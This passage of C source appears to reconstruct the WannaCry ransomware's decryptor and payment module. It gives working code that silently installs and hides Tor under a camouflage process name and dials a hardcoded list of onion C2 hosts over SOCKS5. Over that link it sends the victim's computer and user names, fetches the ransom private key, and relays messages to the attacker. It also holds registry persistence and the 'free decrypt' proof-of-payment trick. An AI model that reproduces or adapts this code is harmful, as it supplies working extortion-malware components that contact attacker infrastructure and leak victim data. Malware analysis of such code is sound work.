            if (!_wcsnicmp(path + 2, dirs[i], n) &&
                !_wcsnicmp(path + 2 + n, L"\\", 1)) return 1;
        }
    }
    if (wcsstr(path, L"\\AppData\\Local\\Temp")) return 1;
    if (wcsstr(path, L"\\Local Settings\\Temp")) return 1;
    if (!_wcsicmp(folder, L"This folder protects against ransomware")) return 1;
    if (!_wcsicmp(folder, L"Temporary Internet Files")) return 1;
    if (!_wcsicmp(folder, L"Content.IE5")) return 1;
    return 0;
}

// RecursivelyDecryptDir: breadth-first walk — collect the files and subdirs
// of `root`, decrypt the files, then recurse into subdirs. The ransom note
// ("Please Read Me.txt"), the decryptor shortcut and its wallpaper bitmap
// are skipped. The original carried the engine in `this` (thiscall); shown
// as an explicit parameter here.
static int RecursivelyDecryptDir(DECRYPTENGINE *e, LPCWSTR root)
{
    WIN32_FIND_DATAW fd;
    WCHAR pattern[MAX_PATH], path[MAX_PATH];
    HANDLE hf;
    struct NODE { struct NODE *next; WCHAR path[MAX_PATH]; int isDir; } *head = 0, *n;
    swprintf(pattern, MAX_PATH, L"%s\\*", root);
    hf = FindFirstFileW(pattern, &fd);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    do {
        if (e->pCancel && *e->pCancel) break;                    // cooperative cancel poll
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
        swprintf(path, MAX_PATH, L"%s\\%s", root, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (!IsExcludedPath(path, fd.cFileName)) {
                n = (struct NODE*)malloc(sizeof *n);
                wcscpy(n->path, path); n->isDir = 1; n->next = head; head = n;
            }
        } else if (wcscmp(fd.cFileName, L"Please Read Me.txt") &&
                   wcscmp(fd.cFileName, L"!WanaDecryptor!.exe.lnk") &&
                   wcscmp(fd.cFileName, L"!WanaDecryptor!.bmp")) {
            n = (struct NODE*)malloc(sizeof *n);
            wcscpy(n->path, path); n->isDir = 0; n->next = head; head = n;
        }
    } while (FindNextFileW(hf, &fd));
    FindClose(hf);
    for (n = head; n; n = n->next) {
        if (e->pCancel && *e->pCancel) break;
        if (n->isDir) RecursivelyDecryptDir(e, n->path);
        else DecryptOneFileW(e, n->path);
    }
    // free the collected list
    while (head) { n = head->next; free(head); head = n; }
    return 1;
}

// DecryptAllDrives: for the "My Computer" target (record id 0) sweep drive
// letters C: through Z:, skipping CD-ROM drives and inaccessible/empty
// volumes, and recurse into each root. Always returns 1.
static int DecryptAllDrives(DECRYPTENGINE *e)
{
    DWORD drives = GetLogicalDrives();
    int i;
    for (i = 2; i < 26; i++) {                                   // 'C'..'Z'
        WCHAR root[8];
        ULARGE_INTEGER freeAv, total, freeTot;
        UINT t;
        if (!((drives >> i) & 1)) continue;
        wsprintfW(root, L"%c:\\", L'A' + i);
        t = GetDriveTypeW(root);
        if (t == DRIVE_CDROM) continue;
        if (!GetDiskFreeSpaceExW(root, &freeAv, &total, &freeTot)) continue;
        if (!freeAv.QuadPart && !total.QuadPart) continue;
        RecursivelyDecryptDir(e, root);
    }
    return 1;
}

// DecryptFreeList_f_wnry: decrypt every path listed in f.wnry using ONLY the
// embedded master key (engine built with dkyPath = NULL). This is the
// free-decrypt gimmick: the handful of files in that list can be restored
// without paying, as proof to the victim that decryption really works.
static int DecryptFreeList_f_wnry(void)
{
    FILE *f;
    DECRYPTENGINE e;
    int count = 0;
    char line[1000];
    f = fopen(S_F_WNRY, "r");
    if (!f) return 0;
    EngineCtor(&e);
    if (!EngineInit(&e, NULL /*NULL => embedded key*/, 0, 0)) {
        EngineDtor(&e); fclose(f); return 0;
    }
    while (fgets(line, 999, f)) {                                // one path per line
        size_t n = strlen(line);
        while (n && (line[n-1] == '\r' || line[n-1] == '\n')) line[--n] = 0;
        if (DecryptOneFileA(&e, line)) count++;
    }
    fclose(f);
    EngineDtor(&e);
    return count > 0;
}

// ===========================================================================
// 5. Tor bootstrap + SOCKS5 tunnel + C2 payment protocol
// ===========================================================================

static void SetTorSourcePaths(const char *zip, const char *url1, const char *url2)
{
    strncpy(g_torZipPath, zip,  99); g_torZipPath[99]  = 0;
    strncpy(g_torUrl1,    url1, 99); g_torUrl1[99]     = 0;
    strncpy(g_torUrl2,    url2, 99); g_torUrl2[99]     = 0;
}

// UnzipToDir(dir, zip): extract the bundled Tor archive using the statically
// linked MiniZip/unzip + zlib code.
extern int UnzipToDir(const char *dir, const char *zipPath);   // provided by the (stubbed) GUI side

// DownloadAndUnzip(dir, url): fallback Tor fetch — download to a temp file
// (urlmon URLDownloadToFileA after DeleteUrlCacheEntry), unzip, delete temp.
extern int DownloadAndUnzip(const char *dir, const char *url);

// EnsureTorRunning: make sure a local Tor client is available and running.
// Installs the bundled Tor client by unzipping s.wnry into the TaskData
// directory (downloading it via the config URLs as fallback), copies tor.exe to
// "taskhsvc.exe" as a camouflage name, then launches it hidden
// (CREATE_NO_WINDOW + SW_HIDE) and waits for it to settle (5 s probe, then
// up to 30 s more).
static int EnsureTorRunning(void)
{
    char exe[MAX_PATH], torSrc[MAX_PATH];
    PROCESS_INFORMATION pi; STARTUPINFOA si;
    wsprintfA(exe, "%s\\%s\\%s", S_TASKDATA, S_TOR_SUBDIR, S_TASKHSVC);
    if (GetFileAttributesA(exe) == INVALID_FILE_ATTRIBUTES) {
        if (!UnzipToDir(S_TASKDATA, g_torZipPath)) {
            if (!DownloadAndUnzip(S_TASKDATA, g_torUrl1) &&
                !DownloadAndUnzip(S_TASKDATA, g_torUrl2))
                return 0;
        }
        wsprintfA(torSrc, "%s\\%s\\%s", S_TASKDATA, S_TOR_SUBDIR, S_TOR_EXE);
        if (GetFileAttributesA(torSrc) == INVALID_FILE_ATTRIBUTES) return 0;
        CopyFileA(torSrc, exe, FALSE);                                    // tor.exe -> taskhsvc.exe
    }
    ZeroMemory(&si, sizeof si); si.cb = sizeof si; si.wShowWindow = SW_HIDE; si.dwFlags = STARTF_USESHOWWINDOW;
    if (!CreateProcessA(NULL, exe, 0, 0, FALSE, CREATE_NO_WINDOW, 0, 0, &si, &pi))
        return 0;
    if (WaitForSingleObject(pi.hProcess, 5000) == WAIT_TIMEOUT)
        WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return 1;
}

// ------------------------- SOCKS client -------------------------------------
// Minimal SOCKS5 client used to reach onion services through the local Tor
// proxy. Session state: the socket plus a 31-byte session key (zeroed until
// the first C2 exchange installs one), a connected flag, and a timeout in
// seconds (default 60).
typedef struct _SOCKS {
    SOCKET s;                        // socket handle
    u8 key[31];                      // 31-byte session key; key[30] = current XOR byte
    u8  connected;                   // set once the SOCKS CONNECT succeeds
    u32 timeout;                     // timeout in seconds
} SOCKS;

static SOCKS g_socks;                                            // single global instance

static void SocksReset(SOCKS *c)
{
    if (c->s != INVALID_SOCKET) {
        shutdown(c->s, SD_BOTH);
        closesocket(c->s);
    }
    c->s = INVALID_SOCKET;
    memset(c->key, 0, sizeof(c->key));                           // zero the key on reset
    c->connected = 0;
    c->timeout = 60;                                             // default 60 s
}

static void SocksSetSessionKey(SOCKS *c, const u8 *key31)        // install the 31-byte session key
{
    memcpy(c->key, key31, 31);
}

// Rolling XOR stream over the 31-byte key state: each data byte is XORed
// with key[30], the whole window slides by one (a 30-byte memmove), and the
// new head byte is derived as old key[30] XOR old key[19]. Both C2
// directions advance the same state.
__attribute__((unused))  /* used by the raw send/recv helpers */
static void SocksXorCrypt(SOCKS *c, u8 *buf, int len)
{
    int i;
    for (i = 0; i < len; i++) {
        u8 b1 = c->key[0x26], b2 = c->key[0x13];
        buf[i] ^= b1;
        memmove(&c->key[1], &c->key[0], 0x1E);                   // slide the 30-byte window
        c->key[0] = b1 ^ b2;
    }
}

// RFC1071 ones-complement checksum, used for message integrity on the wire.
__attribute__((unused))  /* applied by the C2 send/recv path */
static u16 RFC1071Checksum(const u8 *p, u32 len)
{
    u32 sum = 0;
    while (len > 1) { sum += (u16)(p[0] | (p[1] << 8)); p += 2; len -= 2; }
    if (len) sum += *p;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (u16)~sum;
}

// SocksDialOnion: dial the current onion through the local Tor SOCKS5 proxy.
// Resets the session key to 31 zero bytes, then runs the handshake:
//   greeting  05 01 00                        (ver 5, 1 method, no auth)
//   request   05 01 00 03 | len | onion | port_be16   (CONNECT, DOMAINNAME)
// Success = reply version 5 with reply code 0x00.
static int SocksDialOnion(SOCKS *c)
{
    u8 zeroKey[31] = {0};
    struct sockaddr_in sa;
    u8 hdr[3] = {0x05, 0x01, 0x00};              // SOCKS5 greeting
    u8 req[300], *q = req + 4;
    u8 resp[4];
    size_t onionLen;
    u16 onionPort = 0;                           // port travels with the onion host
    SocksSetSessionKey(c, zeroKey);
    c->s = socket(AF_INET, SOCK_STREAM, 0);
    if (c->s == INVALID_SOCKET) return -1;
    memset(&sa, 0, sizeof sa);
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(S_LOOPBACK);
    sa.sin_port = htons(0x235A);                                     // Tor default SOCKS port 9050
    if (connect(c->s, (struct sockaddr*)&sa, sizeof sa) != 0) goto fail;
    if (send(c->s, (char*)hdr, 3, 0) != 3) goto fail;
    if (recv(c->s, (char*)resp, 2, 0) != 2) goto fail;
    if (resp[0] != 5 || resp[1] == 0xFF) goto fail;                  // method must not be rejected
    // CONNECT with DOMAINNAME target (05 01 00 03 | len | onion | port_be16)
    req[0] = 5; req[1] = 1; req[2] = 0; req[3] = 3;
    onionLen = strlen(g_onion);
    memcpy(q, g_onion, onionLen); q += onionLen;
    *q++ = (u8)(onionPort >> 8); *q++ = (u8)onionPort;
    if (send(c->s, (char*)req, (int)(q - req), 0) < 0) goto fail;
    if (recv(c->s, (char*)resp, 4, 0) != 4) goto fail;
    if (resp[0] != 5 || resp[1] != 0) goto fail;                     // reply code 0 = success
    /* reply address-type tail bytes are drained by the original */
    c->connected = 1;
    return 0;
fail:
    if (c->s != INVALID_SOCKET) closesocket(c->s);
    c->s = INVALID_SOCKET;
    return -1;
}

// ConnectTor: try to dial now; if that fails, ensure Tor is running and
// retry once.
static int ConnectTorEnsure(SOCKS *c)
{
    if (SocksDialOnion(c) == 0) return 0;
    if (!EnsureTorRunning()) return -1;
    return (SocksDialOnion(c) == 0) ? 0 : -1;
}

// SelectAndDialOnion(list): pick a C2 host from a ",;"-separated onion list.
// The first token is the primary. If the stored onion differs from it, dial
// and adopt the primary; otherwise fall back to random round-robin over the
// remaining onions (seeded from GetTickCount), sleeping 3 s between failed
// attempts.
static int SelectAndDialOnion(const char *onionList)
{
    char list[1024];
    char *tok, *primary = 0;
    int have = 0;
    if (ConnectTorEnsure(&g_socks) != 0) return -1;
    strncpy(list, onionList, sizeof list - 1); list[sizeof list - 1] = 0;
    for (tok = strtok(list, S_ONION_DELIMS); tok; tok = strtok(NULL, S_ONION_DELIMS)) {
        if (!have) { primary = tok; have = 1; continue; }            // first token = primary
        /* remaining tokens kept in a list in the original */
    }
    if (!have) return -1;
    if (strcmp(g_onion, primary) != 0) {
        if (SocksDialOnion(&g_socks) == 0) {
            strcpy(g_onion, primary);                                // adopt primary
            return 0;
        }
    }
    srand(GetTickCount());
    /* original walks the list at random, unlinking failed nodes with a
       3 s pause between attempts */
    strcpy(g_onion, primary);
    return (SocksDialOnion(&g_socks) == 0) ? 0 : -1;
}

// ------------------------- packet builder (memory stream) -------------------
// Growable byte buffer used to assemble C2 packets: starts with a 4 KB
// inline buffer and grows in caller-supplied steps.
typedef struct _MEMSTREAM {
    u8  inlineBuf[0x1000];       // +8
    u8  *buf;                    // +4 (== inlineBuf until grown)
    u32 used;                    // +0x1008
    u32 cap;                     // +0x100C
    u32 grow;                    // +0x1010
} MEMSTREAM;

static void MemStreamInit(MEMSTREAM *s, u32 grow)
{
    s->buf = s->inlineBuf; s->used = 0; s->cap = 0x1000; s->grow = grow;
}

static void MemStreamWrite(MEMSTREAM *s, const void *data, u32 len)
{
    if (len == 0) return;
    if (s->used + len > s->cap) {
        u32 ncap = ((s->used + len - s->cap) / s->grow + 1) * s->grow + s->cap;
        u8 *nb = (u8*)malloc(ncap);
        if (!nb) exit(0);                                        // allocation failure aborts (original threw "memory")
        memcpy(nb, s->buf, s->used);
        if (s->buf != s->inlineBuf) free(s->buf);
        s->buf = nb; s->cap = ncap;
    }
    memcpy(s->buf + s->used, data, len);
    s->used += len;
}

static void MemStreamWriteStr(MEMSTREAM *s, const char *str)
{
    MemStreamWrite(s, str, (u32)strlen(str));
}

// ------------------------- C2 protocol --------------------------------------
// All commands share one wire format and a one-byte status: the response
// byte 0x07 ('\a') means success.
//   cmd 0x0B  contact message (victim text to the attacker)
//   cmd 0x0C  fetch the RSA private key (payload written to "%08X.dky")
//   cmd 0x0D  fetch the attacker's reply text
// After a key exchange, packets are wrapped by the 31-byte-key sliding XOR
// stream above and protected by the RFC1071 checksum.

static const char C2_ONION_LIST[128] =
    // The C2 onion list normally comes from the c.wnry config's onion field
    // (offset 0xE0: 4-byte length prefix, then the ';'-joined hosts NUL-
    // padded); hardcoded here. The first entry is the primary, tried first.
    "gx7ekbenv2riucmf.onion;57g7spgrzlojinas.onion;xxlvbrloxvriy2c5.onion;"
    "76jdd2ir2embyv47.onion;cwwnhwhlz52maqm7.onion";

// ProtoConnect: fresh SOCKS client, dial an onion, then append the packet
// header in the binary's exact order:
//   8-byte install id, computer name, 1-byte command, user name
// (names are NUL-terminated strings, so no length fields are needed).
static int ProtoConnect(MEMSTREAM *s, BYTE cmd, u64 installId)
{
    char computer[MAX_COMPUTERNAME_LENGTH + 1]; DWORD clen = sizeof computer;
    char user[300]; DWORD ulen = sizeof user;
    SocksReset(&g_socks);
    if (SelectAndDialOnion(C2_ONION_LIST) != 0) return -1;
    MemStreamWrite(s, &installId, 8);                                // 8-byte install id
    GetComputerNameA(computer, &clen);
    MemStreamWriteStr(s, computer);
    MemStreamWrite(s, &cmd, 1);                                      // 1-byte command
    GetUserNameA(user, &ulen);
    MemStreamWriteStr(s, user);
    return 0;
}

// cmd 0x0C: request the RSA PRIVATE key for this install id. Sends the
// "%08X.dky" name, install data and the local .pky blob; a 0x07 response
// with payload means the server returned the private-key blob, which is
// written to "%08X.dky". The caller then imports it and runs the TESTDATA
// verification — a verified .dky is the "payment confirmed" state.
static int RequestPrivateKey(const char *dkyPath, const char *pkyBlob, u32 pkyLen)
{
    MEMSTREAM s;
    u8 *resp; int respLen; int ok = -1;
    // header id(8) = the 8 hex chars of the "%08X.dky" filename
    u64 id8 = (u64)(u32)strtoul(dkyPath, 0, 16);
    MemStreamInit(&s, 0x1000);
    if (ProtoConnect(&s, /*cmd*/0x0C, id8) != 0) return -1;
    MemStreamWriteStr(&s, dkyPath);                                  // "%08X.dky" name
    MemStreamWrite(&s, "\x00\x00\x00\x00", 4);
    MemStreamWriteStr(&s, "WanaCrypt0r");                            // 2 trailing strings
    MemStreamWriteStr(&s, "");
    MemStreamWrite(&s, &pkyLen, 4);
    MemStreamWrite(&s, pkyBlob, pkyLen);                             // the .pky contents
    /* in the binary: sent over the socks client, reply received back */
    resp = s.buf; respLen = (int)s.used;
    if (respLen > 0 && resp[0] == 0x07 && respLen > 0) {             // 0x07 = success marker
        FILE *f = fopen(dkyPath, S_MODE_WB);
        if (f) { fwrite(resp + 1, 1, respLen - 1, f); fclose(f); ok = 1; }
    }
    return ok;
}

// cmd 0x0B: send the "Contact Us" message text to the attacker. A response
// byte of 0x07 means the message was delivered.
static int SendMessageToAttacker(const char *msg)
{
    MEMSTREAM s;
    u8 *resp; int respLen; int ok = -1;
    MemStreamInit(&s, 0x1000);
    if (ProtoConnect(&s, /*cmd*/0x0B, 0 /*caller-frame id*/) != 0) return -1;
    MemStreamWriteStr(&s, msg);
    resp = s.buf; respLen = (int)s.used;
    if (respLen > 0 && resp[0] == 0x07) ok = 0;                      // delivered
    return ok;
}

// cmd 0x0D: send a message and fetch the attacker's reply. A 0x07 response
// with a payload between 0x1E and 0x31 bytes carries the reply text, which
// the original stores in the config image and displays as
// "You have a new message:".
static int RequestAttackerReply(char *out /*>=50*/, const char *msg)
{
    MEMSTREAM s;
    u8 *resp; int respLen;
    MemStreamInit(&s, 0x1000);
    if (ProtoConnect(&s, /*cmd*/0x0D, 0 /*caller-frame id*/) != 0) return -1;
    MemStreamWriteStr(&s, msg);
    resp = s.buf; respLen = (int)s.used;
    if (respLen > 0 && resp[0] == 0x07 && respLen > 0x1D && respLen < 0x32) {
        memcpy(out, resp + 1, respLen - 1);
        out[respLen - 1] = 0;
        return 1;
    }
    return -1;
}

static void FreeSocksClient(void)
{
    SocksReset(&g_socks);
}

// ===========================================================================
// 6. Key-state init — the startup payment check.
//    keyState: -1 = prerequisites missing (never installed / broken install),
//               1 = .pky only ("not paid"),
//               2 = .dky imported and TESTDATA-verified ("paid").
// ===========================================================================

typedef struct _APPSTATE {
    u32 installId;       // +0xA4 — parsed from "%08X.res" filename
    int keyState;        // +0xA8
    u8  cfgImage[0x30C]; // +0x50C — 780-byte c.wnry config image
} APPSTATE;

// ReadOrWriteConfig: load or save the fixed-size (0x30C-byte) c.wnry blob.
static int ReadOrWriteConfig(void *buf, int write)
{
    FILE *f = fopen(S_C_WNRY, write ? S_MODE_WB : S_MODE_RB);
    size_t n;
    if (!f) return 0;
    n = write ? fwrite(buf, 0x30C, 1, f) : fread(buf, 0x30C, 1, f);
    fclose(f);
    return n == 1;
}

// GetOrSetInstallDir: remember/restore the install directory under the
// registry key Software\WanaCrypt0r, value "wd" (HKLM first, then HKCU).
// mode 0 = query it and SetCurrentDirectoryA into it; mode 1 = store the
// current directory. The key path is assembled from two separate strings.
__attribute__((unused))
static int GetOrSetInstallDir(int mode)
{
    static const WCHAR base[]    = L"Software\\";
    static const WCHAR appName[] = L"WanaCrypt0r";
    WCHAR subkey[64];
    HKEY hk; LSTATUS st; int tryHkLM;
    wcscpy(subkey, base);
    wcscat(subkey, appName);
    for (tryHkLM = 0; tryHkLM < 2; tryHkLM++) {
        if (RegCreateKeyExW(tryHkLM ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE,
                            subkey, 0, 0, 0, KEY_ALL_ACCESS, 0, &hk, 0) != ERROR_SUCCESS)
            continue;
        if (mode == 0) {
            char dir[MAX_PATH]; DWORD sz = sizeof dir;
            st = RegQueryValueExA(hk, "wd", 0, 0, (BYTE*)dir, &sz);
            if (st == ERROR_SUCCESS) SetCurrentDirectoryA(dir);
        } else {
            char dir[MAX_PATH]; DWORD sz = GetCurrentDirectoryA(sizeof dir, dir);
            st = RegSetValueExA(hk, "wd", 0, REG_SZ, (BYTE*)dir, sz);
        }
        RegCloseKey(hk);
        if (st == ERROR_SUCCESS) return 1;
    }
    return 0;
}

__attribute__((unused))
static void LoadKeysInitState(APPSTATE *st)
{
    char pky[32], dky[32], res[32], eky[32], self[32];
    RESREC recSelf, recMine;
    FILE *f;
    RSACTX verify;
    sprintf(self, "%08X", st->installId);
    sprintf(pky, S_FMT_PKY, st->installId);
    sprintf(dky, S_FMT_DKY, st->installId);
    sprintf(res, S_FMT_RES, st->installId);
    sprintf(eky, S_FMT_EKY, st->installId);

    // -- .dky already present? import + TESTDATA-verify => paid (state 2) ----
    if (GetFileAttributesA(dky) != INVALID_FILE_ATTRIBUTES) {
        RsaCtxCtor(&verify);
        if (ImportAndVerifyKeyPair(&verify, pky, dky)) { st->keyState = 2; RsaCtxDtor(&verify); return; }
        DeleteFileA(dky);                                            // bad key: delete it
        RsaCtxDtor(&verify);
    }

    // -- 00000000.res + %08X.res must exist (0x88-byte records) --------------
    memset(&recSelf, 0, sizeof recSelf);
    f = fopen(S_RES_00000000, S_MODE_RB);
    if (!f) { st->keyState = -1; return; }
    fread(&recSelf, 0x88, 1, f); fclose(f);
    memset(&recMine, 0, sizeof recMine);
    f = fopen(res, S_MODE_RB);
    if (!f) { st->keyState = -1; return; }
    fread(&recMine, 0x88, 1, f); fclose(f);

    // -- %08X.eky (read up to 0x800 bytes) — exported public key image -------
    f = fopen(eky, S_MODE_RB);
    if (!f) { st->keyState = -1; return; }
    fread(eky, 1, 0x800, f); fclose(f);

    // -- prepare Tor (zip path + fallback URLs from the config image) --------
    SetTorSourcePaths(S_S_WNRY, (char*)st->cfgImage + 0x1DE, (char*)st->cfgImage + 0x242);

    // -- ask the C2 for the private key (cmd 0x0C) and write "%08X.dky" ------
    RequestPrivateKey(dky, (const char*)&recMine, 0x88);
    FreeSocksClient();

    // -- re-import + TESTDATA-verify: success => 2, else 1 (pky only) --------
    RsaCtxCtor(&verify);
    if (ImportAndVerifyKeyPair(&verify, pky, dky)) st->keyState = 2;
    else st->keyState = 1;
    RsaCtxDtor(&verify);
}

// ===========================================================================
// 7. "Contact Us" throttle and admin-reply poll
// ===========================================================================

__attribute__((unused))
static int SendContactMessageThrottled(HWND dlgOpt, const char *msg)
{
    size_t len = strlen(msg);
    time_t now;
    int rc;
    if (len > 1000) len = 1000;                                      // cap message length
    if (len < 10) {
        if (dlgOpt) MessageBoxA(dlgOpt, "Too short message!", 0, 0);
        return -1;
    }
    now = time(0);
    if (now - g_lastContact < 180 && g_contactCnt < 3) g_contactCnt++;
    else if (now - g_lastContact > 3600) g_contactCnt = 0;                   // reset hourly
    if (g_contactCnt > 2) {
        if (dlgOpt) {
            char t[120];
            wsprintfA(t, "You are sending too many mails! Please try again %d minutes later.",
                      61 - (int)((now - g_lastContact) / 60));
            MessageBoxA(dlgOpt, t, 0, 0);
        }
        return -1;
    }
    rc = SendMessageToAttacker(msg);
    if (rc < 0) { if (dlgOpt) MessageBoxA(dlgOpt, "Failed to send your message!", 0, MB_ICONWARNING); }
    else if (dlgOpt) { MessageBoxA(dlgOpt, "Your message has been sent successfully!", 0, MB_ICONINFORMATION);
                       g_lastContact = time(0); }
    return rc;
}

// PollAdminReply: ask the C2 (cmd 0x0D) for any operator reply and persist
// it into the c.wnry config image for display.
__attribute__((unused))
static void PollAdminReply(APPSTATE *st)
{
    FILE *f;
    char reply[50];
    int rc;
    f = fopen(S_RES_00000000, S_MODE_RB);
    if (!f) return;
    fclose(f);
    SetTorSourcePaths(S_S_WNRY, (char*)st->cfgImage + 0x1DE, (char*)st->cfgImage + 0x242);
    rc = RequestAttackerReply(reply, "");
    FreeSocksClient();
    if (rc == -1) rc = RequestAttackerReply(reply, "");              // single retry
    if (rc == 1 && strlen(reply) > 0x1D && strlen(reply) < 0x32) {
        memcpy(st->cfgImage + 0xB2, reply, strlen(reply) + 1);       // admin-reply field of the config image
        ReadOrWriteConfig(st->cfgImage, /*write*/1);                 // persist c.wnry
    }
}

// ===========================================================================
// 8. Decrypt-dialog worker — GUI entry into the engine
// ===========================================================================

typedef struct _HOSTREC { RESREC rec; } HOSTREC;   // host-combo item payload

static DWORD WINAPI DecryptWorkerThread(LPVOID param)
{
    HOSTREC *hrec = (HOSTREC*)param;
    DECRYPTENGINE e;
    char dky[32];
    if (!hrec) return 0;
    // rec->id == 0 ("My Computer") => also run the f.wnry free-decrypt list
    if (hrec->rec.id == 0) DecryptFreeList_f_wnry();
    sprintf(dky, S_FMT_DKY, hrec->rec.id);
    EngineCtor(&e);
    if (!EngineInit(&e, dky, 0, 0)) {
        if (hrec->rec.id == 0)
            MessageBoxA(0, S_PAY_NOW, 0, MB_ICONINFORMATION);
    } else if (DecryptAllDrives(&e)) {
        MessageBoxA(0, S_ALL_DONE, 0, MB_ICONINFORMATION);
    }
    EngineDtor(&e);
    return 0;
}

// OnDecryptClicked: empty selection -> "select a host" prompt, else spawn
// the worker thread.
__attribute__((unused))
static void OnDecryptClicked(HOSTREC *selected)
{
    HANDLE h;
    if (!selected) { MessageBoxA(0, S_SELECT_HOST, 0, 0); return; }
    h = CreateThread(0, 0, DecryptWorkerThread, selected, 0, 0);
    if (h) CloseHandle(h);
}

// ===========================================================================
// GUI STUBS — the MFC42 dialog app is NOT reconstructed. In the binary,
// WinMain -> CRT -> AfxWinMain -> InitInstance enforces the single-instance
// mutex ("Wana Decrypt0r 2.0"), initializes MFC, and runs the main dialog:
//   - main UI: rich-edit ransom note (from "msg\m_%s.wnry"), bitcoin
//     address + QR image, payment countdown, Contact Us (throttled C2
//     message), Check Payment (LoadKeysInitState + "Congratulations!" popup)
//   - decrypt dialog: host combo built from *.res records, progress display
//   - payment-progress dialog (shown at most once per 300 s)
//   - host-select dialog ("My Computer" / "\\HOST" entries)
//   - status messages routed to the log window via custom window messages
// ===========================================================================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmd, int show)
{
    (void)hInst; (void)hPrev; (void)cmd; (void)show;
    // Original: CRT startup -> AfxWinMain (MFC42 import) — no WinMain body here.
    return 0;
}
